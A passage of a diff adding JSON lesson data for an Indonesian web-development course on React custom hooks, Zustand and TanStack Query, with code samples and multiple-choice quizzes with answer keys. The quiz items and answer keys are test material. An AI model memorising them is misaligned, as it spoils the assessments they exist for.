Mandiri\n1. Buat custom hook `useWindowSize` yang mengembalikan `{ width, height }` dari jendela browser saat ukuran layar diubah.\n2. Gunakan di komponen Anda untuk menampilkan ukuran layar secara langsung.\n\n## Ringkasan\n- **Custom Hooks** mengekstrak logika stateful yang reusable dengan prefix **`use`**.\n- Menerapkan prinsip DRY (*Don't Repeat Yourself*) pada logika komponen.\n- Setiap pemanggilan custom hook memiliki **state terisolasi independen**.",
+        "quizzes": [
+          {
+            "id": "q-14-6-1",
+            "question": "Konvensi penamaan apakah yang WAJIB dipatuhi saat membuat Custom Hook di React agar React linter dapat memvalidasi aturan Rules of Hooks?",
+            "options": [
+              "Nama fungsi wajib diawali dengan kata 'use' menggunakan camelCase (contoh: useLocalStorage, useDebounce).",
+              "Nama fungsi wajib diawali dengan kata 'hook'.",
+              "Nama fungsi harus ditulis dalam huruf kapital semua.",
+              "Nama file harus berekstensi .html."
+            ],
+            "correctIndex": 0,
+            "explanation": "Awalan 'use' adalah konvensi resmi React yang mengaktifkan pemeriksaan linter terhadap kepatuhan pemanggilan hooks di dalamnya."
+          },
+          {
+            "id": "q-14-6-2",
+            "question": "Jika dua komponen yang berbeda (Komponen A dan Komponen B) sama-sama memanggil custom hook useCounter(), bagaimana status state di antara kedua komponen tersebut?",
+            "options": [
+              "Setiap komponen memiliki salinan instance state internal yang terisolasi dan independen secara terpisah; mengubah counter di Komponen A tidak akan mengubah counter di Komponen B.",
+              "Kedua komponen otomatis berbagi nilai counter yang sama secara global.",
+              "Komponen B akan otomatis dinonaktifkan.",
+              "React akan melempar error konflik state duplikat."
+            ],
+            "correctIndex": 0,
+            "explanation": "Custom hooks mengekstrak logika stateful, bukan membagikan nilai state bersama; setiap pemanggilan menciptakan alokasi memori state baru."
+          },
+          {
+            "id": "q-14-6-3",
+            "question": "Apa fungsi utama dari custom hook useDebounce pada kotak input pencarian (search bar)?",
+            "options": [
+              "Menunda pembaruan nilai pencarian sampai pengguna berhenti mengetik selama jeda waktu tertentu (misal 500ms), mencegah penembakan request API yang berlebihan di setiap ketikan huruf.",
+              "Mengubah huruf kapital menjadi huruf kecil.",
+              "Mengoreksi ejaan kata yang salah secara otomatis.",
+              "Merekam password pengguna di database."
+            ],
+            "correctIndex": 0,
+            "explanation": "Debouncing mengelompokkan rangkaian event beruntun cepat dan hanya mengeksekusi aksi setelah jeda keheningan, menghemat beban server backend."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-15",
+    "orderIndex": 15,
+    "titleId": "State Management & Data Flow (Zustand & TanStack Query)",
+    "titleEn": "State Management: Zustand & TanStack Query",
+    "category": "Frontend",
+    "description": "Membedakan Client State vs Server State, menguasai global store ringan dengan Zustand (actions, persist middleware), dan async server state dengan TanStack Query (caching, invalidation).",
+    "descriptionEn": "Distinguish Client vs Server State, master Zustand (actions, persist middleware), and TanStack Query (caching, invalidation).",
+    "lessons": [
+      {
+        "id": "lesson-15-1",
+        "stageId": "stage-15",
+        "slug": "client-state-vs-server-state-dikotomi",
+        "title": "Client State vs Server State Dikotomi",
+        "titleEn": "Client State vs Server State Dichotomy",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Membedakan arsitektur dua jenis state: Client State (UI ephemeral: modal terbuka, tema) vs Server State (data asinkron remote: daftar produk, profil dari database).",
+        "prerequisites": [
+          "custom-hooks-reusable-logic-extraction"
+        ],
+        "learningObjectives": [
+          "Menganalisis perbedaan karakteristik Client State vs Server State.",
+          "Menjelaskan mengapa memaksakan Server State ke dalam Global Redux/Context tradisional menciptakan boilerplate kode yang rapuh.",
+          "Memetakan alat yang tepat: Zustand untuk Client State, dan TanStack Query / Server Components untuk Server State."
+        ],
+        "whyMatters": "Memisahkan Client State dan Server State mengeliminasi 80% kode boilerplate `useEffect`, reducer, dan status loading manual yang berantakan.",
+        "careerContext": "Arsitektur frontend modern memisahkan pengelolaan state lokal UI dan server cache secara tegas.",
+        "commonMistakes": [
+          "Menyimpan seluruh data API backend ke dalam Global Redux store secara manual.",
+          "Menggunakan library server-cache untuk state UI murni (seperti status modal terbuka/tutup)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Client State",
+            "definition": "Data yang sepenuhnya dimiliki dan dikendalikan oleh browser client, bersifat sinkron dan ephemeral (modal, tab aktif, sidebar toggle)."
+          },
+          {
+            "term": "Server State",
+            "definition": "Data yang disimpan di server remote database yang bersifat asinkron, dimiliki bersama, dan berpotensi usang (stale)."
+          },
+          {
+            "term": "Stale Data",
+            "definition": "Kondisi di mana data lokal di browser sudah tidak sesuai dengan data terbaru di server database."
+          }
+        ],
+        "contentMd": "# Client State vs Server State Dikotomi\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari revolusi arsitektur state management modern: **Dikotomi Client State vs Server State**, mengapa pendekatan lama (Redux raksasa untuk semua hal) ditinggalkan, dan bagaimana memetakan alat yang tepat (**Zustand** vs **TanStack Query**).\n\n## Mengapa Konsep Ini Penting?\nDahulu, developer memasukkan SEMUA data—mulai dari daftar 10.000 produk dari database hingga status *\"Apakah modal terbuka (true/false)\"*—ke dalam satu Redux Store raksasa. Hal ini menyebabkan kode penuh dengan puluhan action creators, reducers, dan logika sinkronisasi data yang sangat melelahkan.\n\n## 1. Perbedaan Dua Jenis State\n\n| Karakteristik | Client State (State UI Lokal) | Server State (State Data Remote) |\n| :--- | :--- | :--- |\n| **Kepemilikan** | Dimiliki penuh oleh browser pengguna | Dimiliki oleh server database remote |\n| **Sifat Data** | Sinkron & Langsung (*Instant*) | Asinkron (*Promise Fetch*) |\n| **Persistensi** | *Ephemeral* (Hilang saat refresh/tutup) | Persisten di Database Cloud |\n| **Tantangan** | Aksesibilitas antar komponen | **Caching, Deduplikasi, Data Basi (*Stale Data*), Auto-Refetch** |\n| **Contoh Data** | Modal terbuka, Tema Dark/Light, Form Draft | Profil User, Keranjang Belanja, Feed Berita |\n| **Solusi Alat** | **Zustand / useState** | **TanStack Query (React Query) / Server Actions** |\n\n## 2. Mengapa Server State Membutuhkan Penanganan Khusus?\nData di server database bersifat **Shared & Asynchronous**:\n- Ketika Anda membuka halaman produk di HP, data harga mungkin sudah diubah oleh admin toko di komputer lain 10 detik lalu.\n- Data di browser Anda menjadi **Data Basi (*Stale Data*)**.\n- Mengelola status `isLoading`, `isError`, `caching`, `background refetch on window focus`, dan `optimistic updates` secara manual dengan `useEffect` sangat sulit dan rawan bug.\n\n## 3. Peta Arsitektur Modern\n- **Gunakan Zustand**: Khusus untuk **Client State** murni (Toggle Sidebar, Filter UI, State Multi-Step Wizard).\n- **Gunakan TanStack Query (React Query)**: Khusus untuk **Server State** (Data Fetching, Caching, Mutasi POST/PUT/DELETE, Otomasi Refetching).\n\n## Kesalahan Umum Pemula\n- **Menulis useEffect data fetching di setiap halaman**: Menghabiskan waktu menulis boilerplate `const [loading, setLoading] = useState(true)` di 20 komponen berbeda alih-alih menggunakan solusi server-state seperti TanStack Query.\n\n## Praktik Mandiri\n1. Klasifikasikan state berikut ke dalam Client State atau Server State:\n   - Status menu drawer mobile terbuka (*Client State*).\n   - Daftar riwayat transaksi pembayaran (*Server State*).\n   - Indeks tab aktif saat ini (*Client State*).\n   - Sisa stok barang e-commerce (*Server State*).\n\n## Ringkasan\n- **Client State** mengelola UI lokal sinkron (Gunakan **Zustand**).\n- **Server State** mengelola data database asinkron dengan tantangan caching & stale data (Gunakan **TanStack Query**).\n- Memisahkan keduanya menyederhanakan arsitektur aplikasi secara dramatis.",
+        "quizzes": [
+          {
+            "id": "q-15-1-1",
+            "question": "Manakah di bawah ini yang merupakan karakteristik utama dari Server State dibandingkan Client State?",
+            "options": [
+              "Server State tersimpan di server database remote, bersifat asinkron, berpotensi menjadi basi (stale data), dan membutuhkan mekanisme caching serta refetching otomatis.",
+              "Server State hanya hidup saat kursor mouse bergerak.",
+              "Server State tidak bisa disimpan di database.",
+              "Server State selalu sinkron dan tidak pernah mengalami loading."
+            ],
+            "correctIndex": 0,
+            "explanation": "Server State berada di luar kontrol browser lokal dan memerlukan manajemen cache asinkron khusus untuk sinkronisasi data remote."
+          },
+          {
+            "id": "q-15-1-2",
+            "question": "Manakah pasangan alat yang paling ideal dan sesuai dengan standar arsitektur frontend modern untuk mengelola Client State vs Server State?",
+            "options": [
+              "Zustand untuk Client State UI, dan TanStack Query (React Query) untuk Server State Data Fetching & Caching.",
+              "Menggunakan file CSS untuk Server State dan HTML untuk Client State.",
+              "Menggunakan localStorage untuk semua data database.",
+              "Membuat satu file Redux tunggal untuk seluruh fungsi."
+            ],
+            "correctIndex": 0,
+            "explanation": "Pemisahan peran antara Zustand (global client state) dan TanStack Query (server state cache) adalah arsitektur paling bersih dan efisien di industri."
+          },
+          {
+            "id": "q-15-1-3",
+            "question": "Manakah contoh data di bawah ini yang tergolong murni sebagai Client State?",
+            "options": [
+              "Status apakah modal dialog sedang terbuka (isOpen: true/false) dan pilihan tema (light/dark).",
+              "Daftar 100 riwayat transaksi pengguna dari database server.",
+              "Informasi saldo rekening bank pengguna.",
+              "Status verifikasi email akun di database."
+            ],
+            "correctIndex": 0,
+            "explanation": "Status modal dialog dan tema UI adalah state tampilan lokal sinkron yang sepenuhnya dikontrol oleh client browser."
+          }
+        ]
+      },
+      {
+        "id": "lesson-15-2",
+        "stageId": "stage-15",
+        "slug": "zustand-fundamentals-dan-atomic-selectors",
+        "title": "Zustand: Global Store Ringan & Atomic Selectors",
+        "titleEn": "Zustand Store & Atomic Selectors",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Membangun global state management dengan Zustand (create store, set, get), arsitektur Actions di dalam store, dan Atomic Selectors untuk mencegah re-render yang tidak perlu.",
+        "prerequisites": [
+          "client-state-vs-server-state-dikotomi"
+        ],
+        "learningObjectives": [
+          "Membangun global store menggunakan fungsi create() dari Zustand dengan TypeScript.",
+          "Mendefinisikan state dan actions mutasi di dalam satu kesatuan store yang kohesif.",
+          "Menerapkan Atomic Selectors `useStore(state => state.property)` untuk optimasi render granular.",
+          "Membandingkan keunggulan Zustand (tanpa Provider wrapper, ukuran < 1KB) dibanding Redux dan Context API."
+        ],
+        "whyMatters": "Zustand adalah library state management paling dicintai saat ini karena API-nya yang sangat sederhana, tanpa boilerplate, dan berukuran ultra ringan (< 1 KB).",
+        "careerContext": "Zustand telah menjadi standar industri nomor satu di ekosistem React/Next.js modern menggantikan Redux yang terlalu rumit.",
+        "commonMistakes": [
+          "Mengambil seluruh state tanpa selector `const state = useStore()` yang menyebabkan komponen me-render ulang setiap kali ADA properti apapun di store yang berubah.",
+          "Lupa bahwa fungsi `set` di Zustand melakukan shallow merge otomatis pada root level."
+        ],
+        "keyTerms": [
+          {
+            "term": "Zustand",
+            "definition": "Library state management kecil, cepat, dan terukur berbasis hook fungsional tanpa butuh Context Provider."
+          },
+          {
+            "term": "Atomic Selector",
+            "definition": "Pola berlangganan HANYA ke satu properti spesifik dari store untuk mengisolasi re-render."
+          },
+          {
+            "term": "set()",
+            "definition": "Fungsi internal Zustand untuk memperbarui state (melakukan shallow merge otomatis)."
+          }
+        ],
+        "contentMd": "# Zustand: Global Store Ringan & Atomic Selectors\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari library state management paling populer di ekosistem React modern: **Zustand**. Anda akan membangun store global type-safe, menyatukan **State & Actions**, serta menerapkan **Atomic Selectors** untuk performa render kilat.\n\n## Mengapa Konsep Ini Penting?\nContext API mewajibkan pembungkus `<Provider>` dan me-render ulang seluruh komponen anak saat nilainya berubah. Redux membutuhkan ratusan baris boilerplate file. Zustand memberikan kesempurnaan: **tanpa Provider, ukuran < 1 KB, dan performa selektor atomik yang presisi**.\n\n## 1. Membuat Store Global Pertama dengan Zustand\n\n```typescript\n// File: src/stores/useCartStore.ts\nimport { create } from \"zustand\";\n\ninterface CartItem {\n  id: string;\n  nama: string;\n  harga: number;\n}\n\ninterface CartState {\n  items: CartItem[];\n  // Actions didefinisikan langsung di dalam store:\n  tambahItem: (item: CartItem) => void;\n  hapusItem: (id: string) => void;\n  kosongkanKeranjang: () => void;\n}\n\nexport const useCartStore = create<CartState>((set) => ({\n  // State Awal:\n  items: [],\n\n  // Actions:\n  tambahItem: (item) => \n    set((state) => ({ items: [...state.items, item] })),\n\n  hapusItem: (id) => \n    set((state) => ({ items: state.items.filter(i => i.id !== id) })),\n\n  kosongkanKeranjang: () => \n    set({ items: [] })\n}));\n```\n\n## 2. Pola Emas: Atomic Selectors (Mencegah Re-render Berlebih)\nSelalu gunakan **Selector** untuk mengambil HANYA properti yang dibutuhkan komponen:\n\n```tsx\n// Komponen Badge Navbar (HANYA butuh jumlah item):\nexport function CartBadge() {\n  // ATOMIC SELECTOR: Komponen ini HANYA me-render ulang jika jumlah items berubah!\n  const totalItem = useCartStore((state) => state.items.length);\n\n  return <span className=\"badge\">{totalItem}</span>;\n}\n\n// Komponen Tombol Beli (HANYA butuh fungsi aksi):\nexport function TombolBeli({ produk }: { produk: CartItem }) {\n  // Fungsi aksi bersifat stabil dan TIDAK PERNAH memicu re-render!\n  const tambahItem = useCartStore((state) => state.tambahItem);\n\n  return (\n    <button onClick={() => tambahItem(produk)} className=\"btn-beli\">\n      Beli Produk\n    </button>\n  );\n}\n```\n\n> **Jebakan Fatal**: Jangan menulis `const { items, tambahItem } = useCartStore()`! Mengambil seluruh store tanpa fungsi selektor akan membuat komponen me-render ulang saat ADA properti apapun di store yang berubah.\n\n## 3. Keunggulan Zustand dibanding Context API & Redux\n1. **Tanpa `<Provider>`**: Panggil `useCartStore()` di mana saja, bahkan di luar komponen React (seperti di utility function biasa).\n2. **Atomic Subscription**: Komponen hanya re-render jika nilai spesifik yang di-select benar-benar berubah.\n3. **Ukuran Super Ringan**: Kurang dari **1 KB minified** (dibandingkan Redux Toolkit yang puluhan KB).\n\n## Kesalahan Umum Pemula\n- **Memanggil `useCartStore()` tanpa argumen selektor**: Selalu tuliskan `useCartStore(state => state.propertiTarget)`.\n\n## Praktik Mandiri\n1. Buat store `useSidebarStore` dengan state `isOpen: boolean` dan action `toggle: () => void`.\n2. Gunakan di komponen navbar untuk membuka/menutup drawer sidebar.\n\n## Ringkasan\n- **Zustand** adalah solusi global state management modern yang ringan, cepat, dan bebas boilerplate Provider.\n- State dan Actions disatukan secara rapi di dalam **`create()`**.\n- Selalu gunakan **Atomic Selectors (`useStore(state => state.x)`)** untuk mengisolasi re-render komponen.",
+        "quizzes": [
+          {
+            "id": "q-15-2-1",
+            "question": "Apa keunggulan utama Zustand dibandingkan Context API dalam hal optimasi rendering komponen?",
+            "options": [
+              "Zustand mendukung Atomic Selectors (useStore(state => state.x)) sehingga komponen HANYA me-render ulang jika nilai spesifik yang di-select tersebut benar-benar berubah.",
+              "Zustand otomatis mengubah file JavaScript menjadi C++.",
+              "Zustand menghapus seluruh kode CSS dari proyek.",
+              "Zustand mewajibkan pembungkus 10 lapis Provider."
+            ],
+            "correctIndex": 0,
+            "explanation": "Atomic selectors pada Zustand mengisolasi subscription komponen secara granular, mencegah re-render massal yang umum terjadi pada Context API."
+          },
+          {
+            "id": "q-15-2-2",
+            "question": "Bagaimana cara mengambil HANYA fungsi aksi 'tambahItem' dari Zustand store secara efisien tanpa membuat komponen re-render saat data items bertambah?",
+            "options": [
+              "const tambahItem = useCartStore(state => state.tambahItem);",
+              "const { tambahItem } = useCartStore();",
+              "const tambahItem = useCartStore.getAll();",
+              "const tambahItem = useCartStore.actions;"
+            ],
+            "correctIndex": 0,
+            "explanation": "Memilih fungsi aksi secara atomik (state => state.tambahItem) menjamin stabilitas referensi sehingga komponen tidak pernah re-render karena aksi tidak pernah berubah."
+          },
+          {
+            "id": "q-15-2-3",
+            "question": "Apakah Zustand mewajibkan komponen React dibungkus di dalam tag <StoreProvider> pada root aplikasi seperti Context API atau Redux?",
+            "options": [
+              "TIDAK, Zustand tidak membutuhkan Provider wrapper sama sekali dan store dapat dipanggil langsung dari komponen manapun di seluruh aplikasi.",
+              "YA, wajib membungkus dengan <ZustandProvider> di file index.tsx.",
+              "YA, wajib membungkus dengan 2 Provider terpisah.",
+              "Hanya wajib jika menggunakan TypeScript."
+            ],
+            "correctIndex": 0,
+            "explanation": "Zustand menggunakan model store eksternal independen yang dapat diakses langsung via hooks tanpa memerlukan Provider wrapper di pohon JSX."
+          }
+        ]
+      },
+      {
+        "id": "lesson-15-3",
+        "stageId": "stage-15",
+        "slug": "zustand-persist-middleware-dan-custom-storage",
+        "title": "Zustand Persist Middleware & Custom Storage",
+        "titleEn": "Zustand Persist Middleware",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Mengotomatiskan penyimpanan state ke localStorage dengan `persist` middleware, partialization (hanya simpan data tertentu), dan penanganan hidrasi Next.js (SSR hydration mismatch).",
+        "prerequisites": [
+          "zustand-fundamentals-dan-atomic-selectors"
+        ],
+        "learningObjectives": [
+          "Menerapkan middleware persist bawaan Zustand untuk persistensi otomatis ke browser localStorage.",
+          "Menerapkan opsi partialize untuk mengecualikan data sensitif/sementara dari persistensi.",
+          "Mendiagnosis dan memperbaiki masalah Next.js SSR Hydration Mismatch saat membaca localStorage pada render awal."
+        ],
+        "whyMatters": "Menyimpan keranjang belanja dan preferensi user secara otomatis ke LocalStorage tanpa perlu menulis satu baris `useEffect` sinkronisasi manual.",
+        "careerContext": "Fitur persistensi state adalah persyaratan mutlak di aplikasi e-commerce dan dashboard SaaS modern.",
+        "commonMistakes": [
+          "Mengalami error Hydration Mismatch di Next.js karena server merender state awal default sedangkan browser client merender data dari localStorage.",
+          "Menyimpan seluruh state termasuk status error/loading yang seharusnya bersifat sementara."
+        ],
+        "keyTerms": [
+          {
+            "term": "Middleware",
+            "definition": "Fungsi pembungkus yang mencegat dan menambahkan fitur ekstra (seperti logging/persistensi) pada store Zustand."
+          },
+          {
+            "term": "persist",
+            "definition": "Middleware resmi Zustand untuk menyinkronkan state secara otomatis dengan media penyimpanan (localStorage/sessionStorage)."
+          },
+          {
+            "term": "Hydration Mismatch",
+            "definition": "Bug di Next.js saat HTML yang dihasilkan server berbeda dengan HTML yang dirender client pada render pertama."
+          }
+        ],
+        "contentMd": "# Zustand Persist Middleware & Custom Storage\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari fitur **`persist` middleware** di Zustand: cara menyimpan data store secara otomatis ke **`localStorage`**, menyaring properti dengan **`partialize`**, serta mengatasi masalah klasik **Next.js Hydration Mismatch**.\n\n## Mengapa Konsep Ini Penting?\nBayangkan pengguna memasukkan 5 barang ke keranjang belanja, lalu secara tidak sengaja me-refresh halaman browser. Tanpa persistensi, keranjang belanja akan langsung kosong kembali. Persist middleware mengotomatiskan sinkronisasi ke `localStorage` secara instan.\n\n## 1. Menerapkan `persist` Middleware\n\n```typescript\n// File: src/stores/useThemeStore.ts\nimport { create } from \"zustand\";\nimport { persist, createJSONStorage } from \"zustand/middleware\";\n\ninterface ThemeState {\n  isDarkMode: boolean;\n  fontSize: number;\n  toggleDarkMode: () => void;\n}\n\nexport const useThemeStore = create<ThemeState>()(\n  // Bungkus definisi store dengan middleware persist:\n  persist(\n    (set) => ({\n      isDarkMode: false,\n      fontSize: 16,\n      toggleDarkMode: () => set((state) => ({ isDarkMode: !state.isDarkMode })),\n    }),\n    {\n      name: \"belajarinaja-theme-storage\", // Nama unik key di localStorage\n      storage: createJSONStorage(() => localStorage), // Media penyimpanan (default: localStorage)\n      \n      // OPSI PARTIALIZE: Hanya simpan 'isDarkMode', jangan simpan 'fontSize':\n      partialize: (state) => ({ isDarkMode: state.isDarkMode }),\n    }\n  )\n);\n```\n\n## 2. Mengatasi Bug \"Hydration Mismatch\" di Next.js (SSR)\nSaat menggunakan SSR (Server-Side Rendering) di Next.js:\n- **Server** merender HTML dengan nilai default (`isDarkMode: false`).\n- **Client (Browser)** membaca `localStorage` dan mendapati `isDarkMode: true`.\n- **Hasil**: Next.js melempar error merah: *\"Text content does not match server-rendered HTML\"*.\n\n### Solusi Hook Pelindung Hidrasi (`useHydrationStore`):\n```tsx\nimport { useEffect, useState } from \"react\";\n\n// Helper agar komponen menunggu hingga browser selesai membaca localStorage:\nexport function useHydratedStore<T, F>(\n  store: (callback: (state: T) => unknown) => unknown,\n  callback: (state: T) => F\n) {\n  const result = store(callback) as F;\n  const [isHydrated, setIsHydrated] = useState(false);\n\n  useEffect(() => {\n    setIsHydrated(true);\n  }, []);\n\n  return isHydrated ? result : undefined;\n}\n```\n\n## Kesalahan Umum Pemula\n- **Menyimpan data sensitif tanpa enkripsi**: Jangan pernah memasukkan nomor kartu kredit atau token rahasia ke dalam persist storage. Gunakan `partialize` untuk membuang field sensitif.\n\n## Praktik Mandiri\n1. Buat store `useAuthStore` dengan state `token`, `user`, dan `isLoading`.\n2. Gunakan `persist` dengan `partialize` agar hanya `token` dan `user` yang disimpan ke localStorage, sementara `isLoading` diabaikan.\n\n## Ringkasan\n- Middleware **`persist`** menyimpan dan memulihkan state Zustand secara otomatis ke `localStorage`.\n- Gunakan opsi **`partialize`** untuk memilih properti mana saja yang layak disimpan secara permanen.\n- Tangani **Hydration Mismatch** di Next.js dengan memastikan state persisten hanya dirender setelah proses mount di client selesai.",
+        "quizzes": [
+          {
+            "id": "q-15-3-1",
+            "question": "Apa fungsi utama dari middleware persist pada library Zustand?",
+            "options": [
+              "Secara otomatis menyimpan state ke media penyimpanan browser (seperti localStorage) dan memulihkan state tersebut saat halaman dimuat ulang.",
+              "Mengubah warna teks aplikasi secara otomatis.",
+              "Menghubungkan aplikasi ke printer lokal.",
+              "Membatasi jumlah baris kode store."
+            ],
+            "correctIndex": 0,
+            "explanation": "persist middleware menyinkronkan perubahan state ke storage target (localStorage/sessionStorage) secara transparan dan otomatis."
+          },
+          {
+            "id": "q-15-3-2",
+            "question": "Apa fungsi dari opsi 'partialize' di dalam konfigurasi Zustand persist middleware?",
+            "options": [
+              "Menentukan secara selektif properti state mana saja yang ingin disimpan ke localStorage dan mengecualikan properti sementara (seperti isLoading/error).",
+              "Membagi file JavaScript menjadi 2 bagian.",
+              "Mengompresi data dengan format ZIP.",
+              "Menghapus token pengguna secara berkala."
+            ],
+            "correctIndex": 0,
+            "explanation": "partialize: (state) => ({ subset }) memungkinkan developer menyaring data apa saja yang diizinkan masuk ke storage persistensi."
+          },
+          {
+            "id": "q-15-3-3",
+            "question": "Mengapa error 'Hydration Mismatch' sering terjadi di Next.js saat membaca data dari localStorage pada render pertama?",
+            "options": [
+              "Karena server me-render HTML menggunakan initial state default (karena server tidak memiliki akses ke browser localStorage), sedangkan browser client me-render data hasil baca localStorage.",
+              "Karena Next.js melarang penggunaan Zustand.",
+              "Karena browser menolak koneksi internet.",
+              "Karena file CSS belum selesai diunduh."
+            ],
+            "correctIndex": 0,
+            "explanation": "Perbedaan antara HTML statis hasil render server dan DOM hasil pembacaan localStorage di browser memicu ketidakcocokan (hydration mismatch)."
+          }
+        ]
+      },
+      {
+        "id": "lesson-15-4",
+        "stageId": "stage-15",
+        "slug": "tanstack-query-fetching-dan-caching",
+        "title": "TanStack Query: Data Fetching, Caching & Auto-Refetch",
+        "titleEn": "TanStack Query: Fetching & Caching",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Menguasai Server State management dengan TanStack Query v5 (useQuery), Query Keys (`['courses', id]`), status (isLoading, isError, data), staleTime vs gcTime, dan background refetching.",
+        "prerequisites": [
+          "zustand-persist-middleware-dan-custom-storage"
+        ],
+        "learningObjectives": [
+          "Menjelaskan konsep arsitektur Cache Management pada TanStack Query v5.",
+          "Menerapkan hook useQuery untuk fetching data dengan Query Keys terstruktur.",
+          "Membedakan fungsi konfigurasi `staleTime` (kapan data dianggap basi) vs `gcTime` (Garbage Collection time).",
+          "Memanfaatkan fitur bawaan: auto-refetch on window focus, background deduplication, dan retry on network failure."
+        ],
+        "whyMatters": "TanStack Query menggantikan 100 baris kode `useEffect` + `useState` manual dengan 5 baris kode deklaratif yang dilengkapi caching otomatis.",
+        "careerContext": "TanStack Query (React Query) adalah standar industri global nomor satu untuk data fetching di seluruh ekosistem React.",
+        "commonMistakes": [
+          "Tidak memahami `staleTime` (default: 0) sehingga heran mengapa query selalu melakukan request ulang ke server di setiap klik.",
+          "Menggunakan Query Keys yang statis untuk data yang bergantung pada variabel ID dinamis (Query Key WAJIB mencakup seluruh variabel dependensinya: `['user', userId]`)."
+        ],
+        "keyTerms": [
+          {
+            "term": "TanStack Query",
+            "definition": "Library manajemen server state, caching, dan sinkronisasi data asinkron paling tangguh di ekosistem web."
+          },
+          {
+            "term": "Query Key",
+            "definition": "Array identifier unik yang digunakan TanStack Query untuk melacak, me-cache, dan membagikan data antar komponen."
+          },
+          {
+            "term": "staleTime",
+            "definition": "Durasi waktu di mana data yang di-cache dianggap masih segar (fresh) sehingga tidak perlu melakukan request ulang ke server."
+          },
+          {
+            "term": "gcTime (Garbage Collection Time)",
+            "definition": "Durasi waktu data yang tidak aktif dipertahankan di memori sebelum dihapus permanen."
+          }
+        ],
+        "contentMd": "# TanStack Query: Data Fetching, Caching & Auto-Refetch\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari library manajemen Server State nomor satu di dunia: **TanStack Query (React Query v5)**. Anda akan menguasai hook **`useQuery`**, struktur **Query Keys**, status **`data` / `isLoading` / `isError`**, serta konfigurasi **`staleTime` vs `gcTime`**.\n\n## Mengapa Konsep Ini Penting?\nTanpa TanStack Query, Anda harus menulis:\n```tsx\n// CARA LAMA (Melelahkan & Tanpa Caching):\nconst [data, setData] = useState([]);\nconst [loading, setLoading] = useState(true);\nconst [error, setError] = useState(null);\nuseEffect(() => {\n  fetch('/api/kursus').then(...).catch(...).finally(...);\n}, []);\n```\nDengan TanStack Query, semua kerumitan tersebut digantikan oleh **1 baris kode sakti yang otomatis memiliki fitur Caching, Deduplikasi, Auto-Retry, dan Refetch saat jendela browser dibuka kembali**!\n\n## 1. Menyiapkan `QueryClientProvider`\n\n```tsx\n// File: src/main.tsx\nimport { QueryClient, QueryClientProvider } from \"@tanstack/react-query\";\n\nconst queryClient = new QueryClient();\n\nexport function RootApp() {\n  return (\n    <QueryClientProvider client={queryClient}>\n      <App />\n    </QueryClientProvider>\n  );\n}\n```\n\n## 2. Mengambil Data Deklaratif dengan `useQuery`\n\n```tsx\n// File: src/components/DaftarKursus.tsx\nimport { useQuery } from \"@tanstack/react-query\";\n\nasync function fetchCourses() {\n  const res = await fetch(\"https://api.belajarinaja.com/v1/courses\");\n  if (!res.ok) throw new Error(\"Gagal mengambil daftar kursus\");\n  return res.json();\n}\n\nexport function DaftarKursus() {\n  const { data, isLoading, isError, error } = useQuery({\n    queryKey: [\"courses\"], // 1. Identifier Unik Cache\n    queryFn: fetchCourses,  // 2. Fungsi Fetching Asinkron\n    staleTime: 1000 * 60 * 5, // 3. Data dianggap segar selama 5 MENIT (Tidak perlu request ulang!)\n  });\n\n  if (isLoading) return <div>Memuat kursus dari server...</div>;\n  if (isError) return <div>Terjadi kesalahan: {error.message}</div>;\n\n  return (\n    <div>\n      {data.map((kursus: any) => (\n        <div key={kursus.id}>{kursus.title}</div>\n      ))}\n    </div>\n  );\n}\n```\n\n## 3. Konsep Kunci: `staleTime` vs `gcTime`\n- **`staleTime` (Waktu Basi Data - Default: 0)**:  \n  Berapa lama data dianggap \"segar (*fresh*)\". Selama data masih fresh, komponen lain yang meminta data yang sama **TIDAK AKAN menembak request jaringan** dan langsung mengambil dari cache instan.\n- **`gcTime` (Garbage Collection Time - Default: 5 Menit)**:  \n  Berapa lama data yang sedang tidak dipakai oleh komponen manapun di layar tetap disimpan di RAM sebelum dihapus.\n\n## 4. Query Keys Bersyarat (Dependensi Dinamis)\nJika data bergantung pada variabel ID, sertakan ID ke dalam array Query Key:\n\n```tsx\n// Query Key Dinamis: ['courses', courseId]\nconst { data: detailKursus } = useQuery({\n  queryKey: [\"courses\", courseId],\n  queryFn: () => fetchCourseById(courseId),\n  enabled: !!courseId, // HANYA jalankan jika courseId sudah tersedia!\n});\n```\n\n## Kesalahan Umum Pemula\n- **Lupa menyertakan variabel dinamis di queryKey**: Menulis `queryKey: ['courses']` saat mengambil detail produk berdasarkan ID, sehingga data produk A akan tertukar dengan produk B di cache.\n\n## Praktik Mandiri\n1. Buat pemanggilan query dengan `queryKey: ['users', id]`.\n2. Buka DevTools Network dan amati bagaimana berpindah tab browser otomatis memicu background refetch jika data sudah stale.\n\n## Ringkasan\n- **TanStack Query** mengelola server state, caching, dan sinkronisasi data secara otomatis.\n- **`queryKey`** adalah array identifier cache unik yang wajib menyertakan variabel dependensi.\n- **`staleTime`** menentukan berapa lama data dianggap fresh sebelum butuh refetch.\n- **`enabled`** mengontrol eksekusi query secara bersyarat.",
+        "quizzes": [
+          {
+            "id": "q-15-4-1",
+            "question": "Apa fungsi dari array 'queryKey' (contoh: queryKey: ['courses', courseId]) pada hook useQuery di TanStack Query?",
+            "options": [
+              "Sebagai identifier unik untuk mengidentifikasi, meng-cache, dan membagikan data spesifik tersebut di memori antar seluruh komponen aplikasi.",
+              "Untuk mengunci database server agar tidak bisa diakses orang lain.",
+              "Untuk mengenkripsi password user di browser.",
+              "Sebagai nama file gambar di server."
+            ],
+            "correctIndex": 0,
+            "explanation": "queryKey bertindak sebagai kunci index cache unik; jika dependensi (seperti courseId) berubah, TanStack Query otomatis mengambil data baru."
+          },
+          {
+            "id": "q-15-4-2",
+            "question": "Apa perbedaan antara konfigurasi staleTime dan gcTime di TanStack Query v5?",
+            "options": [
